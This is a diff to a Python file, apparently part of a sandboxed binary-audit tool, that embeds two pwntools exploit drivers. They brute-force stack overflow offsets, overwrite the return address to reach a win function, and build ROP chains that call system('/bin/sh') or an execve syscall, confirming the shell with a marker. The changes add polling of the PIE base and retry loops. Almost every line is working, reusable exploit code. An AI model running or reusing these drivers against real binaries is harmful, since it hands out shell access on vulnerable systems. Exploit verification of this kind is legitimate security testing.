@@ -11,7 +11,7 @@ import shutil
 import subprocess
 
 _DRIVER = r'''
-import sys, os
+import sys, os, time
 from pwn import *
 elf = ELF(sys.argv[1], checksec=False); context.binary = elf; context.log_level = "error"
 win_off = None
@@ -24,7 +24,7 @@ try:
     ret_off = ROP(elf).find_gadget(["ret"]).address
 except Exception:
     ret_off = None
-def resolve_base(io):
+def _try_resolve(io):
     for path, b in (io.libs() or {}).items():
         if os.path.basename(path) == os.path.basename(elf.path) and b:
             return b
@@ -35,19 +35,33 @@ def resolve_base(io):
             return min(bases) & ~0xfff       # lowest mapping = ELF load base (not the r-xp seg)
     except Exception:
         pass
+    return None
+def resolve_base(io):
+    # ver _DRIVER_ROP: poll con pausa corta, no una sola lectura (ventana de arranque
+    # intermitente bajo algunos backends del sandbox, p.ej. static-PIE via Rosetta).
+    for _ in range(8):
+        b = _try_resolve(io)
+        if b is not None:
+            return b
+        time.sleep(0.15)
     return 0x555555554000
 MARK = b"win reached"
+# ver _DRIVER_ROP para el por que de RETRIES: resolve_base() puede fallar a atrapar la
+# direccion real por pura ventana de tiempo (confirmado con un static-PIE traducido via Rosetta
+# en vez de qemu-user), no solo por offset/alineacion incorrectos.
+RETRIES = 3
 for off in [72, 64, 88, 56, 96, 104, 80, 40, 120, 112, 128, 136, 48]:
     for a in (1, 0):
-        io = process([elf.path], aslr=False)
-        base = resolve_base(io)
-        chain = b"A" * off + (p64(base + ret_off) if (a and ret_off is not None) else b"") + p64(base + win_off)
-        io.sendline(chain)
-        out = io.recvrepeat(1.0)
-        io.close()
-        if MARK in out:
-            print("VERIFIED off=%d base=%#x win=%#x" % (off, base, base + win_off))
-            sys.exit(0)
+        for _attempt in range(RETRIES):
+            io = process([elf.path], aslr=False)
+            base = resolve_base(io)
+            chain = b"A" * off + (p64(base + ret_off) if (a and ret_off is not None) else b"") + p64(base + win_off)
+            io.sendline(chain)
+            out = io.recvrepeat(1.0)
+            io.close()
+            if MARK in out:
+                print("VERIFIED off=%d base=%#x win=%#x" % (off, base, base + win_off))
+                sys.exit(0)
 print("NOT_VERIFIED"); sys.exit(1)
 '''
 
@@ -56,7 +70,7 @@ _DRIVER_ROP = r'''
 import sys, os, time
 from pwn import *
 elf = ELF(sys.argv[1], checksec=False); context.binary = elf; context.log_level = "error"
-def resolve_base(io):
+def _try_resolve(io):
     for path, b in (io.libs() or {}).items():
         if os.path.basename(path) == os.path.basename(elf.path) and b:
             return b
@@ -67,44 +81,61 @@ def resolve_base(io):
             return min(bases) & ~0xfff       # lowest mapping = ELF load base (not the r-xp seg)
     except Exception:
         pass
+    return None
+def resolve_base(io):
+    # POLL, no una sola lectura: bajo algunos backends del sandbox (confirmado con un binario
+    # static-PIE traducido via Rosetta en Apple Silicon Docker Desktop en vez de qemu-user),
+    # /proc/pid/maps solo muestra el mapeo REAL del ELF (en vez de solo el wrapper del
+    # traductor) durante una ventana de arranque breve e intermitente. Reintentar la LECTURA
+    # varias veces con una pausa corta, dentro del MISMO proceso ya lanzado, cierra esa ventana
+    # de forma mucho mas fiable que relanzar procesos nuevos de cero cada vez.
+    for _ in range(8):
+        b = _try_resolve(io)
+        if b is not None:
+            return b
+        time.sleep(0.15)
     return 0x555555554000
 MARK = b"BINORACLE_PWNED"
 # ASLR is off in the sandbox, so once we resolve the (fixed) PIE base every gadget/string is
 # at base+offset; we rebase the ELF, build a ROP chain and confirm a real shell via MARK.
+# Ademas del poll en resolve_base(), unos pocos reintentos POR offset (no solo mas offsets)
+# cubren el caso raro en que incluso el poll no atrapa la ventana buena.
+RETRIES = 3
 for off in [72, 64, 88, 56, 96, 104, 80, 40, 120, 112, 128, 136, 48, 152, 168, 200]:
-    io = process([elf.path], aslr=False)
-    base = resolve_base(io)
-    elf.address = base                      # rebases symbols, gadgets and search() to absolute
-    binsh = next(elf.search(b"/bin/sh\x00"), None)
-    rop = ROP(elf)
-    built = False
-    try:
-        sysaddr = (elf.plt.get("system") if elf.plt else None) or (elf.symbols or {}).get("system")
-        if binsh is not None and sysaddr:
-            try: rop.raw(rop.find_gadget(["ret"]).address)
-            except Exception: pass
-            rop.call(sysaddr, [binsh]); built = True         # ret2libc system('/bin/sh')
-        elif binsh is not None:
-            rop.rax = 0x3b; rop.rdi = binsh; rop.rsi = 0; rop.rdx = 0
-            sc = rop.find_gadget(["syscall", "ret"]) or rop.find_gadget(["syscall"])
-            if sc: rop.raw(sc.address); built = True          # execve('/bin/sh') syscall
-    except Exception:
+    for _attempt in range(RETRIES):
+        io = process([elf.path], aslr=False)
+        base = resolve_base(io)
+        elf.address = base                      # rebases symbols, gadgets and search() to absolute
+        binsh = next(elf.search(b"/bin/sh\x00"), None)
+        rop = ROP(elf)
         built = False
-    if not built:
-        io.close(); continue
-    try:
-        chain = rop.chain()
-    except Exception:
-        io.close(); continue
-    try:
-        io.sendline(b"A" * off + chain)
-        time.sleep(0.5); io.sendline(b"echo " + MARK)
-        out = io.recvrepeat(2.5)                 # generous: the audit runs many sandboxes, load is high
-    except Exception:
-        out = b""
-    io.close()
-    if MARK in out:
-        print("VERIFIED off=%d base=%#x strategy=rop-pie" % (off, base)); sys.exit(0)
+        try:
+            sysaddr = (elf.plt.get("system") if elf.plt else None) or (elf.symbols or {}).get("system")
+            if binsh is not None and sysaddr:
+                try: rop.raw(rop.find_gadget(["ret"]).address)
+                except Exception: pass
+                rop.call(sysaddr, [binsh]); built = True         # ret2libc system('/bin/sh')
+            elif binsh is not None:
+                rop.rax = 0x3b; rop.rdi = binsh; rop.rsi = 0; rop.rdx = 0
+                sc = rop.find_gadget(["syscall", "ret"]) or rop.find_gadget(["syscall"])
+                if sc: rop.raw(sc.address); built = True          # execve('/bin/sh') syscall
+        except Exception:
+            built = False
+        if not built:
+            io.close(); break                   # gadgets/binsh missing: retrying won't help, next offset
+        try:
+            chain = rop.chain()
+        except Exception:
+            io.close(); break
+        try:
+            io.sendline(b"A" * off + chain)
+            time.sleep(0.5); io.sendline(b"echo " + MARK)
+            out = io.recvrepeat(2.5)                 # generous: the audit runs many sandboxes, load is high
+        except Exception:
+            out = b""
+        io.close()
+        if MARK in out:
+            print("VERIFIED off=%d base=%#x strategy=rop-pie" % (off, base)); sys.exit(0)
 print("NOT_VERIFIED"); sys.exit(1)
 '''
 
